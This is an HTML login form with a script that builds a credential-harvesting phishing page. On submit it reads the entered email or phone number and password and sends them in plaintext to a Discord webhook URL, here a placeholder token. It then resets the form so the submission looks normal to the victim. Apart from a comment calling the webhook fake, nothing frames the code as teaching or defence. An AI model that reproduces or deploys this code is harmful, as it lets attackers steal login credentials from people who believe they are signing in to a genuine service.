<form id="loginForm">
    <div class="input-groups">
        <div class="email-wrapper">
            <label for="emailORphone">
                Email or Phone Number
                <span class="required">*</span>
            </label>
            <input type="text" id="emailORphone" required autocomplete="off">
        </div>
        <div class="password-wrapper">
            <label for="password">
                Password
                <span class="required">*</span>
            </label>
            <input type="password" id="password" required>
        </div>
    </div>
    <div class="login">
        <button type="submit">Log In</button>
    </div>
</form>

<script>
document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault(); // prevent page reload

    const email = document.getElementById('emailORphone').value;
    const password = document.getElementById('password').value;

    // Fake webhook URL (doesn't exist)
    const webhookURL = "https://discord.com/api/webhooks/FAKE_ID/FAKE_TOKEN";

    fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            content: `Email/Phone: ${email}\nPassword: ${password}`,
            username: "FakeWebhook"
        })
    }).finally(() => {
        this.reset(); // reset the form like a normal submission
    });
});
</script>
